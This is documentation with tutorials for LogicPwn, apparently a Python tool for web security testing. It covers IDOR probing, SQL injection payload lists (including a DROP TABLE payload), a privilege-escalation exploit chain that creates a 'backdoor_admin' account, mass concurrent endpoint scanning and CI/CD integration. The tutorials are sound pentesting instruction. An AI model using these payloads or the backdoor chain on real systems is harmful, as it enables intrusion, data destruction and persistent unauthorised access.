.. _tutorials:

Comprehensive Tutorials & Guides
================================

Master LogicPwn with these step-by-step tutorials covering real-world security testing scenarios. Each tutorial builds practical skills while demonstrating LogicPwn's advanced capabilities.

🎓 Beginner Tutorials
---------------------

Tutorial 1: Your First Business Logic Test
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Objective**: Learn to identify and exploit an IDOR vulnerability in a web application.

**Prerequisites**: Basic understanding of web applications and HTTP requests.

**What You'll Learn**:
- Setting up LogicPwn for a new target
- Configuring authentication workflows
- Systematic IDOR testing methodology
- Interpreting and acting on results

**Step-by-Step Implementation**:

.. code-block:: python

   # Step 1: Import required modules
   from logicpwn.core.auth import AuthConfig
   from logicpwn.core.access import detect_idor_flaws, AccessDetectorConfig
   from logicpwn.core.integration_utils import AuthenticatedValidator
   import requests
   
   # Step 2: Configure target application authentication
   # Replace with your actual target application details
   auth_config = AuthConfig(
       url="https://demo-app.com/login",
       credentials={
           "username": "testuser",
           "password": "testpassword"
       },
       success_indicators=["Welcome", "Dashboard", "Profile"],
       failure_indicators=["Invalid credentials", "Login failed"]
   )
   
   # Step 3: Set up authenticated session
   validator = AuthenticatedValidator(auth_config, "https://demo-app.com")
   
   if validator.authenticate():
       print("✅ Authentication successful!")
       
       # Step 4: Define IDOR test parameters
       # Test access to user profile endpoints
       endpoint_template = "https://demo-app.com/api/users/{id}/profile"
       test_ids = ["1", "2", "3", "admin", "guest"]
       
       # Step 5: Configure access detection
       idor_config = AccessDetectorConfig(
           current_user_id="2",           # We're logged in as user 2
           authorized_ids=["2"],          # Should only access user 2
           unauthorized_ids=["1", "3", "admin", "guest"],  # Should NOT access these
           compare_unauthenticated=True   # Also test without authentication
       )
       
       # Step 6: Execute systematic IDOR testing
       print("🔍 Starting IDOR vulnerability testing...")
       results = detect_idor_flaws(
           validator.session,
           endpoint_template,
           test_ids,
           success_indicators=["user_data", "profile", "email"],
           failure_indicators=["access_denied", "unauthorized", "403"],
           config=idor_config
       )
       
       # Step 7: Analyze and report results
       vulnerabilities_found = []
       for result in results:
           print(f"\n📋 Testing ID: {result.id_tested}")
           print(f"   Status: {result.status_code}")
           print(f"   Access granted: {result.access_granted}")
           print(f"   Vulnerability: {result.vulnerability_detected}")
           
           if result.vulnerability_detected:
               vulnerabilities_found.append(result)
               print(f"   ⚠️  VULNERABILITY: Unauthorized access to {result.endpoint_url}")
       
       # Step 8: Summary report
       print(f"\n📊 IDOR Testing Summary:")
       print(f"   Total tests: {len(results)}")
       print(f"   Vulnerabilities found: {len(vulnerabilities_found)}")
       
       if vulnerabilities_found:
           print(f"\n🚨 Critical findings requiring immediate attention:")
           for vuln in vulnerabilities_found:
               print(f"   - User {vuln.id_tested}: {vuln.endpoint_url}")
   else:
       print("❌ Authentication failed. Check your credentials.")

**Expected Output**:

.. code-block:: text

   ✅ Authentication successful!
   🔍 Starting IDOR vulnerability testing...
   
   📋 Testing ID: 1
      Status: 200
      Access granted: True
      Vulnerability: True
      ⚠️  VULNERABILITY: Unauthorized access to https://demo-app.com/api/users/1/profile
   
   📋 Testing ID: 2
      Status: 200  
      Access granted: True
      Vulnerability: False
   
   📊 IDOR Testing Summary:
      Total tests: 5
      Vulnerabilities found: 2

**Key Learning Points**:
- IDOR vulnerabilities occur when applications don't properly validate user access to resources
- Systematic testing across multiple user IDs reveals access control gaps
- LogicPwn's automated approach scales to test thousands of endpoints efficiently

Tutorial 2: Automated SQL Injection Detection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Objective**: Use LogicPwn's validation presets to systematically test for SQL injection vulnerabilities.

.. code-block:: python

   from logicpwn.core.validator import validate_with_preset, list_available_presets
   from logicpwn.core.integration_utils import AuthenticatedValidator
   
   # Step 1: Explore available validation presets
   print("Available validation presets:")
   presets = list_available_presets()
   for preset in presets:
       print(f"  - {preset}")
   
   # Step 2: Set up authenticated testing
   validator = AuthenticatedValidator(auth_config, "https://target-app.com")
   validator.authenticate()
   
   # Step 3: Define SQL injection test payloads
   sql_payloads = [
       "' OR 1=1--",
       "' UNION SELECT 1,2,3--", 
       "'; DROP TABLE users--",
       "' OR 'x'='x",
       "1' AND 1=1--",
       "admin'--"
   ]
   
   # Step 4: Test multiple endpoints with SQL injection payloads
   test_endpoints = [
       "/search",
       "/user/profile", 
       "/admin/users",
       "/api/data/export"
   ]
   
   print("\n🔍 Starting SQL Injection Testing...")
   vulnerabilities = []
   
   for endpoint in test_endpoints:
       print(f"\n📍 Testing endpoint: {endpoint}")
       
       for payload in sql_payloads:
           # Test GET parameter injection
           result = validator.request_and_validate(
               "GET", 
               f"{endpoint}?search={payload}",
               validation_preset="sql_injection"
           )
           
           if result['validation'].is_valid:
               vulnerability = {
                   'endpoint': endpoint,
                   'method': 'GET',
                   'parameter': 'search',
                   'payload': payload,
                   'confidence': result['validation'].confidence_score,
                   'indicators': result['validation'].matched_patterns
               }
               vulnerabilities.append(vulnerability)
               print(f"   ⚠️  SQL Injection detected!")
               print(f"       Payload: {payload}")
               print(f"       Confidence: {vulnerability['confidence']}")
   
   # Step 5: Generate vulnerability report
   print(f"\n📊 SQL Injection Testing Summary:")
   print(f"   Endpoints tested: {len(test_endpoints)}")
   print(f"   Payloads per endpoint: {len(sql_payloads)}")
   print(f"   Total tests: {len(test_endpoints) * len(sql_payloads)}")
   print(f"   Vulnerabilities found: {len(vulnerabilities)}")

🚀 Intermediate Tutorials  
-------------------------

Tutorial 3: Complex Multi-Step Exploit Chain
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Objective**: Build an automated privilege escalation attack chain.

.. code-block:: python

   from logicpwn.core.exploit_engine.models import ExploitChain, ExploitStep
   from logicpwn.core.exploit_engine.exploit_engine import run_exploit_chain
   from logicpwn.models.request_config import RequestConfig
   
   # Advanced exploit chain for privilege escalation
   privilege_escalation_chain = ExploitChain(
       name="Multi-Step Privilege Escalation",
       description="Automated attack chain from user to admin access",
       steps=[
           # Step 1: Initial user authentication
           ExploitStep(
               name="User Authentication",
               description="Login as regular user account",
               request_config=RequestConfig(
                   url="https://target.com/api/auth/login",
                   method="POST",
                   data={
                       "username": "regularuser",
                       "password": "userpass123"
                   },
                   headers={"Content-Type": "application/json"}
               ),
               success_indicators=["access_token", "user_role"],
               failure_indicators=["invalid_credentials", "auth_failed"]
           ),
           
           # Step 2: Extract session token for privilege escalation
           ExploitStep(
               name="Token Extraction",
               description="Extract authentication token from user session",
               request_config=RequestConfig(
                   url="https://target.com/api/user/session",
                   method="GET"
               ),
               success_indicators=["session_token", "csrf_token"],
               payload_injection_points=[
                   PayloadInjectionPoint(
                       location="header",
                       parameter="Authorization", 
                       extraction_pattern=r'"token":"([^"]+)"'
                   )
               ]
           ),
           
           # Step 3: Attempt admin function access
           ExploitStep(
               name="Admin Access Attempt",
               description="Try to access admin-only functionality",
               request_config=RequestConfig(
                   url="https://target.com/api/admin/users",
                   method="GET"
               ),
               success_indicators=["admin_panel", "user_management", "all_users"],
               failure_indicators=["access_denied", "insufficient_privileges"],
               critical=True  # Mark as critical step
           ),
           
           # Step 4: User creation with admin privileges
           ExploitStep(
               name="Admin User Creation",
               description="Create new admin user account",
               request_config=RequestConfig(
                   url="https://target.com/api/admin/users/create",
                   method="POST",
                   data={
                       "username": "backdoor_admin",
                       "password": "backdoor123!",
                       "role": "administrator",
                       "permissions": ["all"]
                   }
               ),
               success_indicators=["user_created", "admin_role_assigned"],
               failure_indicators=["creation_failed", "permission_denied"],
               critical=True
           )
       ]
   )
   
   # Execute the exploit chain
   print("🚀 Starting automated privilege escalation...")
   results = run_exploit_chain(authenticated_session, privilege_escalation_chain)
   
   # Analyze results
   successful_steps = 0
   critical_failures = 0
   
   for result in results:
       print(f"\n📋 Step: {result.step_name}")
       print(f"   Status: {result.status}")
       
       if result.status == "success":
           successful_steps += 1
           print(f"   ✅ Success: {result.response_summary}")
       else:
           print(f"   ❌ Failed: {result.error_message}")
           if result.critical:
               critical_failures += 1
   
   print(f"\n📊 Exploit Chain Summary:")
   print(f"   Total steps: {len(results)}")
   print(f"   Successful steps: {successful_steps}")
   print(f"   Critical failures: {critical_failures}")
   
   if successful_steps == len(results):
       print("🎯 FULL PRIVILEGE ESCALATION SUCCESSFUL!")
   elif critical_failures > 0:
       print("⚠️  Critical steps failed - partial exploitation only")

Tutorial 4: High-Performance Concurrent Testing
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Objective**: Scale security testing to handle thousands of endpoints efficiently.

.. code-block:: python

   import asyncio
   from logicpwn.core.runner import AsyncSessionManager
   from logicpwn.core.stress import StressTester, StressTestConfig
   from logicpwn.core.performance import monitor_performance
   
   @monitor_performance("large_scale_security_test")
   async def large_scale_security_testing():
       """
       Test 1000+ endpoints for IDOR vulnerabilities concurrently.
       """
       
       # Step 1: Generate large test dataset
       base_endpoints = [
           "/api/users/{id}",
           "/api/orders/{id}", 
           "/api/documents/{id}",
           "/api/profiles/{id}",
           "/api/messages/{id}"
       ]
       
       user_ids = range(1, 201)  # Test 200 user IDs
       test_endpoints = []
       
       for endpoint_template in base_endpoints:
           for user_id in user_ids:
               test_endpoints.append(
                   endpoint_template.format(id=user_id)
               )
       
       print(f"🎯 Prepared {len(test_endpoints)} endpoints for testing")
       
       # Step 2: Configure high-performance testing
       stress_config = StressTestConfig(
           max_concurrent=100,      # 100 simultaneous connections
           duration=300,            # 5 minutes maximum
           memory_monitoring=True,
           cpu_monitoring=True
       )
       
       # Step 3: Execute concurrent testing
       async with StressTester(stress_config) as tester:
           print("🚀 Starting high-performance security testing...")
           
           # Convert endpoints to request configs
           request_configs = [
               {"url": f"https://target.com{endpoint}", "method": "GET"}
               for endpoint in test_endpoints
           ]
           
           # Run stress test with security validation
           metrics = await tester.run_stress_test(
               request_configs,
               auth_config=auth_config
           )
           
           print(f"\n📊 Performance Metrics:")
           print(f"   Total requests: {metrics.total_requests}")
           print(f"   Requests per second: {metrics.requests_per_second:.2f}")
           print(f"   Success rate: {metrics.success_rate:.1f}%")
           print(f"   Average response time: {metrics.avg_response_time:.2f}ms")
           print(f"   Peak memory usage: {metrics.peak_memory_mb:.1f}MB")
           print(f"   Peak CPU usage: {metrics.peak_cpu_percent:.1f}%")
           
           # Step 4: Analyze security findings
           security_issues = []
           for request_id, result in metrics.detailed_results.items():
               if result.get('security_analysis', {}).get('has_vulnerabilities'):
                   security_issues.append({
                       'endpoint': result['url'],
                       'issues': result['security_analysis']
                   })
           
           print(f"\n🔍 Security Analysis:")
           print(f"   Endpoints with vulnerabilities: {len(security_issues)}")
           
           return metrics, security_issues

   # Run the large-scale test
   async def main():
       metrics, issues = await large_scale_security_testing()
       
       if issues:
           print("\n⚠️  Security vulnerabilities found:")
           for issue in issues[:5]:  # Show first 5 issues
               print(f"   - {issue['endpoint']}")
   
   asyncio.run(main())

🎯 Advanced Tutorials
--------------------

Tutorial 5: Custom Validation Rule Development
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Objective**: Create application-specific security validation rules.

.. code-block:: python

   from logicpwn.core.validator.validator_models import ValidationConfig, ValidationResult
   from logicpwn.core.validator import validate_response
   import re
   
   class CustomBankingValidator:
       """Custom validation rules for banking applications."""
       
       @staticmethod
       def create_account_number_exposure_validator():
           """Detect exposure of sensitive account numbers."""
           return ValidationConfig(
               failure_criteria=[
                   "account number", "account_number", "acct_num",
                   "routing number", "routing_number", "sort_code"
               ],
               regex_patterns=[
                   r'\b\d{10,12}\b',        # Account numbers (10-12 digits)
                   r'\b\d{9}\b',            # Routing numbers (9 digits)
                   r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b'  # Credit cards
               ],
               confidence_threshold=0.8,
               require_all_patterns=False
           )
       
       @staticmethod 
       def create_transaction_manipulation_validator():
           """Detect transaction manipulation vulnerabilities."""
           return ValidationConfig(
               success_criteria=[
                   "transaction_successful", "payment_processed", 
                   "transfer_complete", "balance_updated"
               ],
               failure_criteria=[
                   "insufficient_funds", "invalid_account",
                   "transaction_failed", "authorization_declined"
               ],
               regex_patterns=[
                   r'amount["\']:\s*["\']?(-?\d+\.?\d*)["\']?',  # Negative amounts
                   r'balance["\']:\s*["\']?(\d+\.?\d*)["\']?'    # Balance extraction
               ],
               confidence_threshold=0.9
           )
   
   # Usage example
   banking_validator = CustomBankingValidator()
   
   # Test for account number exposure
   account_validator = banking_validator.create_account_number_exposure_validator()
   
   # Mock response that might contain sensitive data
   test_response = MockResponse(
       text='{"user": "john_doe", "account_number": "1234567890", "balance": 5000}',
       status_code=200
   )
   
   result = validate_response(test_response, account_validator)
   
   if result.is_valid:
       print("⚠️  Account number exposure detected!")
       print(f"   Confidence: {result.confidence_score}")
       print(f"   Matched patterns: {result.matched_patterns}")

Tutorial 6: Enterprise CI/CD Integration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Objective**: Integrate LogicPwn into enterprise deployment pipelines.

.. code-block:: yaml

   # .github/workflows/security-pipeline.yml
   name: Enterprise Security Pipeline
   
   on:
     push:
       branches: [main, develop, staging]
     pull_request:
       branches: [main]
     schedule:
       - cron: '0 2 * * *'  # Daily at 2 AM
   
   jobs:
     security-assessment:
       runs-on: ubuntu-latest
       
       strategy:
         matrix:
           environment: [staging, production]
           test-suite: [api-security, business-logic, performance]
       
       steps:
         - name: Checkout Code
           uses: actions/checkout@v3
         
         - name: Setup Python Environment
           uses: actions/setup-python@v4
           with:
             python-version: '3.11'
         
         - name: Install LogicPwn Enterprise
           run: |
             pip install logicpwn[enterprise,async,reporting]
         
         - name: Configure Security Testing
           env:
             LOGICPWN_LICENSE: ${{ secrets.LOGICPWN_ENTERPRISE_LICENSE }}
             TARGET_ENV: ${{ matrix.environment }}
           run: |
             # Generate environment-specific configuration
             python scripts/generate_security_config.py \
               --environment $TARGET_ENV \
               --test-suite ${{ matrix.test-suite }}
         
         - name: Execute Security Testing
           run: |
             python -m logicpwn.enterprise.security_pipeline \
               --config security-config-${{ matrix.environment }}.yaml \
               --test-suite ${{ matrix.test-suite }} \
               --output security-results-${{ matrix.test-suite }}.json \
               --fail-on-critical
         
         - name: Generate Security Report
           if: always()
           run: |
             python -m logicpwn.enterprise.report_generator \
               --input security-results-${{ matrix.test-suite }}.json \
               --format executive-summary \
               --output security-report-${{ matrix.test-suite }}.pdf
         
         - name: Upload Security Artifacts
           uses: actions/upload-artifact@v3
           if: always()
           with:
             name: security-results-${{ matrix.environment }}-${{ matrix.test-suite }}
             path: |
               security-results-*.json
               security-report-*.pdf
         
         - name: Notify Security Team
           if: failure()
           uses: 8398a7/action-slack@v3
           with:
             status: failure
             channel: '#security-alerts'
             text: 'Critical security vulnerabilities detected in ${{ matrix.environment }}'
           env:
             SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK }}

.. code-block:: python

   # scripts/generate_security_config.py
   """
   Generate environment-specific LogicPwn configuration for CI/CD pipeline.
   """
   
   import yaml
   import argparse
   import os
   
   def generate_security_config(environment, test_suite):
       """Generate security testing configuration for specific environment."""
       
       base_config = {
           'staging': {
               'base_url': 'https://staging-api.company.com',
               'auth': {
                   'url': 'https://staging-auth.company.com/login',
                   'credentials': {
                       'username': os.getenv('STAGING_TEST_USER'),
                       'password': os.getenv('STAGING_TEST_PASS')
                   }
               },
               'concurrency': 50,
               'timeout': 30
           },
           'production': {
               'base_url': 'https://api.company.com', 
               'auth': {
                   'url': 'https://auth.company.com/login',
                   'credentials': {
                       'username': os.getenv('PROD_TEST_USER'),
                       'password': os.getenv('PROD_TEST_PASS')  
                   }
               },
               'concurrency': 20,  # Lower concurrency for production
               'timeout': 60
           }
       }
       
       test_suites = {
           'api-security': {
               'tests': ['sql_injection', 'xss', 'auth_bypass'],
               'endpoints': ['/api/v1/users', '/api/v1/orders', '/api/v1/payments'],
               'validation_presets': ['sql_injection', 'xss', 'auth_bypass']
           },
           'business-logic': {
               'tests': ['idor', 'privilege_escalation', 'workflow_bypass'],
               'exploit_chains': ['user_to_admin', 'payment_manipulation'],
               'access_control_matrix': True
           },
           'performance': {
               'tests': ['load_testing', 'stress_testing', 'concurrent_user_simulation'],
               'max_concurrent': 100,
               'duration': 300,
               'memory_monitoring': True
           }
       }
       
       config = {
           **base_config[environment],
           'test_suite': test_suites[test_suite],
           'reporting': {
               'formats': ['json', 'html', 'pdf'],
               'include_executive_summary': True,
               'compliance_mapping': ['SOC2', 'ISO27001']
           }
       }
       
       return config

📚 Best Practices & Tips
------------------------

**Performance Optimization**

1. **Use Async for Scale**: When testing 100+ endpoints, always use async execution
2. **Implement Rate Limiting**: Respect target application limits to avoid blocking
3. **Monitor Resource Usage**: Track memory and CPU during large-scale testing
4. **Cache Authenticated Sessions**: Reuse authentication tokens when possible

**Security Testing Methodology**

1. **Start with Authentication**: Always verify authentication mechanisms first
2. **Systematic IDOR Testing**: Test access controls across all user roles and resources
3. **Business Logic Focus**: Look beyond technical vulnerabilities to workflow flaws
4. **Document Everything**: Maintain detailed logs and evidence for all testing

**CI/CD Integration**

1. **Environment-Specific Configs**: Different settings for dev/staging/production
2. **Fail-Fast Principle**: Stop pipeline on critical security vulnerabilities
3. **Automated Reporting**: Generate reports automatically for security teams
4. **Notification Integration**: Alert security teams immediately on critical findings

.. seealso::

   * :doc:`getting_started` - Basic concepts and installation
   * :doc:`api_reference` - Complete function documentation  
   * :doc:`case_studies` - Real-world implementation examples
